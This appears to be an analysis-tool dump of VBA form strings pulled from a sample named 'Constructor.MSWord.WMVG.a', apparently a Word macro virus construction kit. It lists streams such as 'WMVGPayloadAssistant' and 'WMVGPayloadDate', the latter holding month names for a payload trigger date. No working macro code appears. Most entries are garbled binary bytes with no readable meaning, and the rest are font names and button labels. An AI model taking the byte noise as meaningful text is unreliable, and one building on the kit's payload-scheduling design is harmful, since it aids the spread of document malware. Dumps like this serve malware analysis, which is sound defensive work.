VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ā��WW�4��T��oo�.��T&y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I,I<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kQ[Ěe���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R���I"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ps�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������ť�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�!������:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��aU�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
л~g���)o4�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���QC�h�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

H�\��e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�c^��\�Ο���[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�x.�ˌ]�?4e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ps�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%��Ld�U8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uIs��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QV@��_(����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����b�X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$���R۱��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`cv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��¼����eq�3����n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h�%��>D��k+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ri2��|��?ZY�f�\�.Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fU\��N�3�ձ���4-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�l�so
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pK�f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�Z���kx.��D�t%L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i\�1PHS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�����:�i�AU��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$v�$(<r>��'Q�*ቕ:>��|D�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�&�}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݫ|�ѳ29
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�uVd9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%Fp{`�5h%iϗ�1$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zd����pk��|2-d��B��+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�''�׃�pp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)5�[ܔ�����M��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?L{֕)ʓ�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aUsE�h�/Z���t�~�#7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�w0,��̌
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��i 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3�85��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xtϳ�vP9���XF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xݷ9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CY��QE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)����O�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/ڻ�����t�����MfG{I�Q�a�#��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ƽ�Jim����[��[����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ќ}[�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F7�rq���:~U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�7?hM&�#-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v��*k��}�%Wk�^*n�GJ;�y.�tiQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H�p3t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�z'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
È��	��2@9��x��}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JԴ���Y�4����l��V~
��<��7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bh���M&� � ��8�
�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�Q���T��dxWA�|3�[�z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�m�L;��nb�$��'���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�Iϵ:���
(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��KX|�I�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��B�|^�v�.�f6�J^[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
А���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x'�Wֺ�Z�ۻ�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����פ`z
B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����{U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�|f�}ߍ<"�v�=�7��+wlnњ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uV]���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���+���5�
��MO[Ҍ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}���=�!tb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D9A�6G�n3���Ҍ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�8_FW����mH�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�����SP(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Back]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Clear
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS49
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadAssistant/i19/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSsag
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
December
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Septembers M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
January
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Febuary
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
April
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
March
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
August@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
October
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
November
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Every MonthM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i132/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSrm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSrm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGPayloadDate/i84/o'
